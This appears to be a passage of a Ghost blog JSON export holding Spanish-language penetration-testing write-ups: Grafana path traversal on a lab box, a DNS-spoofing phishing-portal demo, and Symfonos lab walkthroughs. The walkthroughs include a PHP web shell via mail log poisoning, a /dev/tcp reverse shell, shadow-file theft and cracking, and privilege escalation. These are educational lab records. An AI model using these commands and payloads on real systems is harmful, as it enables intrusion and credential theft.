Path\n---------------------------------------------------------------------------\nGrafana 8.3.0 - Directory Traversal and Arbitrary File Read  |    multiple/webapps/50581.py\n---------------------------------------------------------------------------\n\nExaminando un poco el exploit, vemos que podemos provocar un LFI con un simple comando de CURL.\n\n> curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/passwd\n\n# Output\nroot:x:0:0:root:/root:/bin/bash\n...\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\n...\ngrafana:x:113:118::/usr/share/grafana:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\nconsul:x:997:997::/home/consul:/bin/false\n\nBuscando un poco por archivos que pueden resultarnos de interés en este caso, examinamos el archivo de configuración de Grafana almacenado en /etc/grafana/grafana.ini.\n\n> curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/grafana/grafana.ini\n\n# Output\n...\n# default admin user, created on startup\n;admin_user = admin\n\n# default admin password, can be changed before first start of grafana,  or in profile settings\nadmin_password = messageInABottle685427\n...\n\nCon esas credenciales, podemos entrar directamente al panel de Grafana. En él, vemos que hay una base de datos MySQL configurada, pero no podemos ver sus credenciales. Además de eso, no hay mucho más que podamos hacer por esa vía. Otra ruta de interés es /var/lib/grafana/grafana.db.\n\nEsta ruta contiene una base de datos sqlite, donde se almacenan los Dashboards configurados. Con el siguiente comando nos descargamos la base de datos.\n\ncurl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n100  644k  100  644k    0     0   529k      0  0:00:01  0:00:01 --:--:--  529k\n\nY empezamos a mirar cosas:\n\n> sqlite3 grafana.db\nsqlite> .tables\n...          \ndata_source                 test_data                 \n...\nsqlite> select * from data_source;\n2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-01 19:26:31|0|{}|1|uKewFgM4z\n\nLlegado a este punto, probamos a",
            "feature_image": "__GHOST_URL__/content/images/2023/01/Ambassador.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-01-01T19:09:55.000Z",
            "updated_at": "2023-01-01T20:02:52.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63b46952800e7e005b48f6e1",
            "uuid": "7d11f328-c297-4c2d-a9aa-bd178bff9f76",
            "title": "DNS Spoofing - POC",
            "slug": "wifi-pineapple-mkvii",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<img src=\\\"https://wizardzines.com/comics/life-of-a-dns-query/life-of-a-dns-query.png\\\"/>\"}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"ey!\",\"backgroundColor\":\"pink\"}],[\"code\",{\"language\":\"bash\",\"code\":\"# File: /etc/hosts\\n# \\n# <ip address>    <dns name to spoof>\\n192.168.0.10      doogle.es\"}],[\"code\",{\"language\":\"bash\",\"code\":\"#> killall dnsmasq && /etc/init.d/dnsmasq start\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/iphone14_spoof.jpg\",\"width\":1928,\"height\":1200,\"caption\":\"DNS Spoofing gmail.google.es\"}],[\"code\",{\"language\":\"bash\",\"code\":\"evil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:05 +0000] \\\"GET /assets/css/custom.css HTTP/1.1\\\" 200 1263 \\\"http://gmail.google.es/\\\" \\\"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\\\"\\n\\nevil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:53 +0000] \\\"GET /controller.php?email=Iker%40prueba.es&password=TeNmUcHoCuIdAdO&hostname=&mac=&ip=172.18.0.1&target=http%3A%2F%2Fgmail.google.es%2F HTTP/1.1\\\" 302 266 \\\"http://gmail.google.es/\\\" \\\"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\\\"\"}]],\"markups\":[[\"em\"],[\"a\",[\"href\",\"https://wizardzines.com/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Hace poco me compré el WiFi Pineapple Mk7 de Hack5. Y voy a explicar como funciona los dns utilizando ilustraciones de \"],[0,[0,1],2,\"Julia Evans (@b0rk)\"]]],[10,0],[1,\"p\",[[0,[],0,\"Update /etc/hosts\"]]],[10,1],[1,\"p\",[]],[10,2],[1,\"p\",[[0,[],0,\"Clear DNS cache\"]]],[10,3],[1,\"p\",[[0,[],0,\"Vamos al movil\"]]],[10,4],[1,\"p\",[[0,[],0,\"y ahora de nuevo\"]]],[1,\"p\",[]],[10,5]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Hace poco me compré el WiFi Pineapple Mk7 de Hack5. Y voy a explicar como funciona los dns utilizando ilustraciones de <em><a href=\"https://wizardzines.com/\">Julia Evans (@b0rk)</a></em></p><!--kg-card-begin: html--><img src=\"https://wizardzines.com/comics/life-of-a-dns-query/life-of-a-dns-query.png\"/><!--kg-card-end: html--><p>Update /etc/hosts</p><div class=\"kg-card kg-callout-card kg-callout-card-pink\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">ey!</div></div><p></p><pre><code class=\"language-bash\"># File: /etc/hosts\n# \n# &lt;ip address&gt;    &lt;dns name to spoof&gt;\n192.168.0.10      doogle.es</code></pre><p>Clear DNS cache</p><pre><code class=\"language-bash\">#&gt; killall dnsmasq &amp;&amp; /etc/init.d/dnsmasq start</code></pre><p>Vamos al movil</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/01/iphone14_spoof.jpg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1928\" height=\"1200\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/iphone14_spoof.jpg 600w, __GHOST_URL__/content/images/size/w1000/2023/01/iphone14_spoof.jpg 1000w, __GHOST_URL__/content/images/size/w1600/2023/01/iphone14_spoof.jpg 1600w, __GHOST_URL__/content/images/2023/01/iphone14_spoof.jpg 1928w\" sizes=\"(min-width: 720px) 720px\"><figcaption>DNS Spoofing gmail.google.es</figcaption></figure><p>y ahora de nuevo</p><p></p><pre><code class=\"language-bash\">evil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:05 +0000] \"GET /assets/css/custom.css HTTP/1.1\" 200 1263 \"http://gmail.google.es/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\"\n\nevil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:53 +0000] \"GET /controller.php?email=Iker%40prueba.es&amp;password=TeNmUcHoCuIdAdO&amp;hostname=&amp;mac=&amp;ip=172.18.0.1&amp;target=http%3A%2F%2Fgmail.google.es%2F HTTP/1.1\" 302 266 \"http://gmail.google.es/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\"</code></pre>",
            "comment_id": "63b46952800e7e005b48f6e1",
            "plaintext": "Hace poco me compré el WiFi Pineapple Mk7 de Hack5. Y voy a explicar como funciona los dns utilizando ilustraciones de Julia Evans (@b0rk)\n\nUpdate /etc/hosts\n\n⚠️ey!\n\n\n\n# File: /etc/hosts\n# \n# <ip address>    <dns name to spoof>\n192.168.0.10      doogle.es\n\nClear DNS cache\n\n#> killall dnsmasq && /etc/init.d/dnsmasq start\n\nVamos al movil\n\ny ahora de nuevo\n\n\n\nevil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:05 +0000] \"GET /assets/css/custom.css HTTP/1.1\" 200 1263 \"http://gmail.google.es/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\"\n\nevil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:53 +0000] \"GET /controller.php?email=Iker%40prueba.es&password=TeNmUcHoCuIdAdO&hostname=&mac=&ip=172.18.0.1&target=http%3A%2F%2Fgmail.google.es%2F HTTP/1.1\" 302 266 \"http://gmail.google.es/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\"",
            "feature_image": null,
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-01-03T17:43:46.000Z",
            "updated_at": "2023-01-08T17:33:22.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63c19da32ff057005b02d09b",
            "uuid": "37c6ff82-b7f9-4bc5-88d3-481ce027f048",
            "title": "Symfony 1 y 2",
            "slug": "symfony-1-y-2",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"Con arp-scan buscamos la maquina\"]]],[1,\"p\",[[0,[],0,\"con macchanger -l | grep 08:00:27 vemos que es de VBOX\"]]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Con arp-scan buscamos la maquina</p><p>con macchanger -l | grep 08:00:27 vemos que es de VBOX</p>",
            "comment_id": "63c19da32ff057005b02d09b",
            "plaintext": "Con arp-scan buscamos la maquina\n\ncon macchanger -l | grep 08:00:27 vemos que es de VBOX",
            "feature_image": null,
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-01-13T18:06:27.000Z",
            "updated_at": "2023-01-13T18:10:54.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63c345ee39046b006481bee9",
            "uuid": "498b22e3-515e-43ed-bc16-ee6bdb6e2e7d",
            "title": "Symfonos 1 y 2 - Write Up",
            "slug": "symfonos-1-y-2-write-up",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/Symfonos-Network.svg\",\"width\":1054,\"height\":279}],[\"code\",{\"code\":\"cat /proc/net/arp\\n# IP address       HW type     Flags       HW address            Mask     Device\\n# 192.168.1.140    0x1         0x2         08:00:27:5a:60:b1     *        enp0s3\\n# 192.168.1.137    0x1         0x0         00:00:00:00:00:00     *        enp0s3\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"ping -c 1 192.168.1.140 -R\\n# PING 192.168.1.140 (192.168.1.140) 56(124) bytes of data.\\n# 64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=0.420 ms\\n# RR: \\t192.168.1.138\\n# \\t    192.168.1.140\\n# \\t    192.168.1.140\\n#\\t    192.168.1.138\\n\",\"language\":\"bash\"}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"TTL~64 -&gt; Linux\",\"backgroundColor\":\"yellow\"}],[\"code\",{\"code\":\"nmap -p- -sS -vvv --open -n -Pn --min-rate 5000 192.168.1.140 -oG allPorts\\n# Open ports: 22,25,80,139,445\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"nmap -p22,25,80,139,445 -sCV 192.168.1.140 -oN targeted\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"# Nmap 7.92 scan initiated Sat Jan 14 11:57:45 2023 as: nmap -p22,25,80,139,445 -sCV -oN targeted 192.168.1.140\\nNmap scan report for symfonos.local (192.168.1.140)\\nHost is up (0.00047s latency).\\nPORT    STATE SERVICE     VERSION\\n22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\\n...\\n25/tcp  open  smtp        Postfix smtpd\\n...\\n80/tcp  open  http        Apache httpd 2.4.25 ((Debian))\\n...\\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\\n445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)\\nMAC Address: 08:00:27:5A:60:B1 (Oracle VirtualBox virtual NIC)\\n...\\n\",\"language\":\"java\"}],[\"code\",{\"code\":\"smbmap -H 192.168.1.140\\n# [+] Guest session   \\tIP: 192.168.1.140:445\\tName: symfonos.local                                    \\n#         Disk                                           \\tPermissions\\tComment\\n#         ----                                             \\t-----------\\t-------\\n# \\t\\tprint$                                            \\tNO ACCESS\\tPrinter Drivers\\n# \\t\\thelios                                            \\tNO ACCESS\\tHelios personal share\\n#    \\tanonymous                                         \\tREAD ONLY\\t\\n#     \\tIPC$                                              \\tNO ACCESS\\tIPC Service\\nsmbmap -H 192.168.1.140 -r anonymous\\n# [+] Guest session   \\tIP: 192.168.1.140:445\\tName: symfonos.local                                    \\n#\\tanonymous                                         \\tREAD ONLY\\t\\n#\\t.\\\\anonymous\\\\*\\n#\\tdr--r--r--                0 Sat Jun 29 03:14:49 2019\\t.\\n#\\tdr--r--r--                0 Sat Jun 29 03:12:15 2019\\t..\\n#\\tfr--r--r--              154 Sat Jun 29 03:14:49 2019\\tattention.txt\\nsmbmap -H 192.168.1.140 --download anonymous/attention.txt\\n# [+] Starting download: anonymous\\\\attention.txt (154 bytes)\\n# [+] File output to: /home/iocio/Desktop/VulnHub/Symfonos1/content/192.168.1.140-anonymous_attention.txt\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! \\n\\nNext person I find using one of these passwords will be fired!\\n\\n-Zeus\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"smbmap -H 192.168.1.140 -u helios -p qwerty\\n# [+] IP: 192.168.1.140:445\\tName: symfonos.local                                    \\n#        Disk                                                  \\tPermissions\\tComment\\n#     \\t----                                                  \\t-----------\\t-------\\n#   \\tprint$                                            \\tREAD ONLY\\tPrinter Drivers\\n#   \\thelios                                            \\tREAD ONLY\\tHelios personal #   \\tanonymous                                         \\tREAD ONLY\\t\\n#   \\tIPC$                                              \\tNO ACCESS\\tIPC Service\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"1. Binge watch Dexter\\n2. Dance\\n3. Work on /h3l105\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"192.168.1.140    symfonos.local\\n\",\"language\":\"bash\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/Helios-Wordpress.png\",\"width\":818,\"height\":880}],[\"code\",{\"code\":\"curl -X get 192.168.1.140/h3l105/ | grep 'wp-content' | grep -oP \\\"'.*?'\\\" | grep symfonos.local | cut -d '/' -f 1-7 | sort -u | grep plugins\\n# 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta\\n# 'http://symfonos.local/h3l105/wp-content/plugins/site-editor\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"searchsploit mail masta\\n# WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                  | php/webapps/50226.py\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"curl -X GET \\\"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd\\\"\\n# root:x:0:0:root:/root:/bin/bash\\n# helios:x:1000:1000:,,,:/home/helios:/bin/bash \\n\"}],[\"code\",{\"code\":\"./lfi_read_file.sh -f /var/mail/helios\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"telnet 192.168.1.140 25\\n# Connected to 192.168.1.140.\\n# Escape character is '^]'.\\n# 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)\\nMAIL FROM: 0x10\\n# 250 2.1.0 Ok\\nRCPT TO: helios\\n# 250 2.1.5 Ok\\nDATA\\n# 354 End data with <CR><LF>.<CR><LF>\\n<?php system($_GET['cmd']) ?>\\n.\\n# 250 2.0.0 Ok: queued as 9ACCB4083E\\nquit\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"# attacker\\nsudo nc -lvnp 443\\nlistening on [any] 443 ...\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"# vulnerable machine\\ncurl -vs -X GET \\\"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=%2Fbin%2Fbash+-c+%22sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.138%2F443+0%3E%261%22\\\"\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"# attacker\\n# sudo nc -lvnp 443\\n# listening on [any] 443 ...\\nconnect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54028\\nsh: 0: can't access tty; job control turned off\\n$ whoami\\nhelios\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"find \\\\-perm -4000 2>/dev/null\\n# ./usr/lib/eject/dmcrypt-get-device\\n# ./usr/lib/dbus-1.0/dbus-daemon-launch-helper\\n# ./usr/lib/openssh/ssh-keysign\\n# ./usr/bin/passwd\\n# ./usr/bin/gpasswd\\n# ./usr/bin/newgrp\\n# ./usr/bin/chsh\\n# ./usr/bin/chfn\\n# ./opt/statuscheck\\n# ./bin/mount\\n# ./bin/umount\\n# ./bin/bash\\n# ./bin/su\\n# ./bin/ping\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"strings /opt/statuscheck\\n# ...\\n# _ITM_registerTMCloneTable\\n# GLIBC_2.2.5\\n# curl -I H\\n# http://lH\\n# ocalhostH\\n# AWAVA\\n# AUATL\\n# ...\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"chmod u+s /bin/bash\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"export PATH=/tmp:$PATH\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"sudo /opt/statuscheck\\n/bin/bash -p\\nwhoami\\n# root\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"hostname -I\\n10.10.10.4 192.168.1.140\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"cat /proc/net/arp\\nash-4.4# cat /proc/net/arp\\nIP address       HW type     Flags       HW address            Mask     Device\\n10.10.10.3       0x1         0x2         08:00:27:44:fe:76     *        enp0s8\\n192.168.1.138    0x1         0x2         08:00:27:40:1b:d1     *        enp0s17\\n192.168.1.1      0x1         0x2         b0:8b:92:fa:45:dc     *        enp0s17\\n192.168.1.136    0x1         0x2         68:b6:91:4e:42:0c     *        enp0s17\\n\",\"language\":\"bash\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/Symfonos-Proxychains.svg\",\"width\":1039,\"height\":382}],[\"code\",{\"code\":\"wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz\\ngunzip chisel_1.7.7_linux_amd64.gz\\nmv chisel_1.7.7_linux_amd64 chisel\\npython -m http.server 8080\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"wget 192.168.1.138:8080/chisel\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"chisel server --reverse -p 1234\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"chisel client 192.168.1.138:1234 R:socks\\n# When connection is stablished, chisel server output\\n# 2023/01/13 23:32:12 server: session#3: tun: proxy#R:127.0.0.1:1080=>socks: Listening\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"nano /etc/proxychains.conf\\n#[ProxyList]\\n# add proxy here ...\\n# meanwile\\n# defaults set to \\\"tor\\\"\\n#socks4     127.0.0.1 9050\\nsocks5 127.0.0.1 1080 # this port depends on Chisel result\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"proxychains nmap --top-ports 50 -sT -vvv --open -n -Pn --min-rate 5000 10.10.10.3 -oG allPorts 2>&1 | grep -vE \\\"timeout|OK\\\"\\n\",\"language\":\"bash\"}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"Recuerda que con <strong>Proxychains</strong>, no se puede utilizar la opción<em> -sS</em> porque entra en conflicto con el túnel. Hay que cambiar el parámetro a <em>-sT</em> para utilizar peticiones TCP normales.\",\"backgroundColor\":\"red\"}],[\"code\",{\"code\":\"proxychains nmap -p21,22,80,139,445 --open -T5 -v -n -sTV -Pn 10.10.10.3 -oN targeted 2>&1 | grep -vE \\\"OK\\\"\\n# PORT    STATE SERVICE     VERSION\\n# 21/tcp  open  ftp         ProFTPD 1.3.5\\n# 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\\n# 80/tcp  open  http        WebFS httpd 1.21\\n# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\\n# 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\\n# Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"proxychains smbmap -H 10.10.10.3 --download anonymous/backups/log.txt\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak\\nroot@symfonos2:~# cat /etc/samba/smb.conf\\n#\\n# Sample configuration file for the Samba suite for Debian GNU/Linux.\\n#\\n#\\n# This is the main Samba configuration file. You should read the\\n# smb.conf(5) manual page in order to understand the options listed\\n# here. Samba has a huge number of configurable options most of which \\n# are not shown in this example\\n...\\n[anonymous]\\n 258   │    path = /home/aeolus/share\\n 259   │    browseable = yes\\n 260   │    read only = yes\\n 261   │    guest ok = yes\\n...\\nUser\\t\\t\\t\\taeolus\\nGroup\\t\\t\\t\\taeolus\\n...\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"searchsploit proftp 1.3.5\\n# ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt\\nsearchsploit -x linux/remote/36742.txt\\n# Description TJ Saunders 2015-04-07 16:35:03 UTC\\n# Vadim Melihow reported a critical issue with proftpd installations that use the\\n# mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands to be used by *unauthenticated clients*:\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"proxychains ftp 10.10.10.3\\nName (10.10.10.3:iocio): \\n# 331 Password required for iocio\\nPassword:\\n# 530 Login incorrect.\\n# Login failed.\\n# Remote system type is UNIX.\\n# Using binary mode to transfer files.\\nftp> site CPFR /var/backups/shadow.bak\\n# 350 File or directory exists, ready for destination name\\nftp> site CPTO /home/aeolus/share/shadow\\n# 250 Copy successful\\nquit\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"proxychains smbmap -H 10.10.10.3 --download anonymous/shadow\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"john --wordlist=/usr/share/wordlists/rockyou.txt shadow\\njohn --show shadow\\n# aeolus:sergioteamo:18095:0:99999:7:::\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"proxychains ssh aeolus@10.10.10.3\\naeolus@symfonos2:~$ whoami\\n# aeolus\\naeolus@symfonos2:~$ hostname -I\\n# 10.10.10.3\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"ss -tulpn\\n# Netid  State      Recv-Q Send-Q                                   Local Address:Port\\n# ...\\n# tcp    LISTEN     0      128                                         127.0.0.1:8080\\n# ...\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"proxychains ssh -L 8080:127.0.0.1:8080 aeolus@10.10.10.3\\n\",\"language\":\"bash\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/LibreNMS.png\",\"width\":662,\"height\":430}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/LibreNMS-Logged.png\",\"width\":629,\"height\":348}],[\"code\",{\"code\":\"searchsploit librenms\\n# LibreNMS 1.46 - 'addhost' Remote Code Execution                  php/webapps/47044.py\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"$ whoami\\n# cronus\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"socat TCP-LISTEN:4646,fork TCP:192.168.1.138:4646\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"nc -lvnp 4646\\n# listening on [any] 4646 ...\\n# connect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54208\\n# /bin/sh: 0: can't access tty; job control turned off\\n$ whoami\\ncronus\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"sudo -l\\n# Matching Defaults entries for cronus on symfonos2:\\n#     env_reset, mail_badpass,\\n#     secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\n# User cronus may run the following commands on symfonos2:\\n#     (root) NOPASSWD: /usr/bin/mysql\\n\",\"language\":\"bash\"}],[\"code\",{\"code\":\"sudo mysql -e '\\\\! /bin/sh'\\ncronus@symfonos2:/$ sudo mysql -e '\\\\! /bin/sh'\\nwhoami\\n# root\\ncat /root/proof.txt\\n\\n\\tCongrats on rooting symfonos:2!\\n\\n           ,   ,\\n         ,-`{-`/\\n      ,-~ , \\\\ {-~~-,\\n    ,~  ,   ,`,-~~-,`,\\n  ,`   ,   { {      } }                                             }/\\n ;     ,--/`\\\\ \\\\    / /                                     }/      /,/\\n;  ,-./      \\\\ \\\\  { {  (                                  /,;    ,/ ,/\\n; /   `       } } `, `-`-.___                            / `,  ,/  `,/\\n \\\\|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;\\n  `        { {                                     __  /  ,`/   ,`,;\\n        /   \\\\ \\\\                                 _,`, `{  `,{   `,`;`\\n       {     } }       /~\\\\         .-:::-.     (--,   ;\\\\ `,}  `,`;\\n       \\\\\\\\._./ /      /` , \\\\      ,:::::::::,     `~;   \\\\},/  `,`;     ,-=-\\n        `-..-`      /. `  .\\\\_   ;:::::::::::;  __,{     `/  `,`;     {\\n                   / , ~ . ^ `~`\\\\:::::::::::<<~>-,,`,    `-,  ``,_    }\\n                /~~ . `  . ~  , .`~~\\\\:::::::;    _-~  ;__,        `,-`\\n       /`\\\\    /~,  . ~ , '  `  ,  .` \\\\::::;`   <<<~```   ``-,,__   ;\\n      /` .`\\\\ /` .  ^  ,  ~  ,  . ` . ~\\\\~                       \\\\\\\\, `,__\\n     / ` , ,`\\\\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \\\\\\n    / , ~ . ~ \\\\ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``\\n  /` ` . ~ . ` `\\\\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___\\n/` . `  ,  . ~ , \\\\  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,\\n\\n\\tContact me via Twitter @zayotic to give feedback!\\n\",\"language\":\"bash\"}]],\"markups\":[[\"strong\"],[\"code\"],[\"em\"],[\"a\",[\"href\",\"https://github.com/jpillora/chisel/releases\"]],[\"a\",[\"href\",\"http://localhost:8080\"]],[\"a\",[\"href\",\"https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/\"]],[\"a\",[\"href\",\"https://gtfobins.github.io/gtfobins/mysql/#sudo\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Máquinas \"],[0,[0],1,\"easy \"],[0,[],0,\"y \"],[0,[0],1,\"medium\"],[0,[],0,\", donde aprovechamos la técnica del \"],[0,[0],1,\"pivoting \"],[0,[],0,\"para saltar entre ellas y llegar a la prueba final. Enumeramos mucho, nos aprovechamos de \"],[0,[0],1,\"smbmap\"],[0,[],0,\", un plugin de mail de Wordpress, \"],[0,[0],1,\"Log Poisoning\"],[0,[],0,\", \"],[0,[0],1,\"Path Hijacking\"],[0,[],0,\", vulnerabilidad de \"],[0,[0],1,\"FTP\"],[0,[],0,\", \"],[0,[0],1,\"BruteForce \"],[0,[],0,\"del archivo shadow, LibreNMS vulnerable y posibilidad de ejecutar MySQL como sudo.\"]]],[10,0],[1,\"h1\",[[0,[],0,\"Symfonos 1\"]]],[1,\"h2\",[[0,[],0,\"Primeros pasos\"]]],[1,\"p\",[[0,[],0,\"En este caso, desconocemos la IP de la máquina. Lo primero que vamos a hacer es recoger los host visibles desde mi equipo cacheados en la tabla ARP. Una alternativa sería utilizar \"],[0,[0],1,\"ArpScan\"],[0,[],0,\".\"]]],[10,1],[1,\"p\",[[0,[],0,\"La IP 192.168.1.140 es nuestro objetivo ahora.\"]]],[1,\"p\",[[0,[],0,\"Con un ping, obtenemos el TTL para saber si se refiere a una máquina Linux o una Windows.\"]]],[10,2],[10,3],[1,\"h2\",[[0,[],0,\"Reconocimiento\"]]],[1,\"p\",[[0,[],0,\"Mediante \"],[0,[0],1,\"nmap \"],[0,[],0,\"escaneamos los puertos abiertos.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Afinamos la búsqueda una vez conocidos los puertos 